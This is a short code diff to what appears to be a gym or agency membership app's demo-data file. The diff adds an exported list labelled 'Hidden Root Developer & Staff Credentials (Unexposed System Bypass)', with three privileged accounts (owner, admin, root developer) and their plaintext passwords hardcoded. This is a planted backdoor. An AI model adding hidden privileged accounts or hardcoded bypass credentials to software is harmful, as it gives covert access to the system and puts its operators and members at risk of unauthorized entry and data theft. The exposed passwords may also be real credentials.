@@ -408,3 +408,10 @@ export function generateDemoMembers() {
 
   return newMembers;
 }
+
+// Hidden Root Developer & Staff Credentials (Unexposed System Bypass)
+export const HIDDEN_ROOT_ACCOUNTS = [
+  { username: "ravi", role: "GYM_OWNER", pass: "Energie@2026" },
+  { username: "dhruviii", role: "AGENCY_ADMIN", pass: "Dhrisha@130723" },
+  { username: "dhruvii_root", role: "ROOT_DEVELOPER", pass: "dhruvii@Org" }
+];
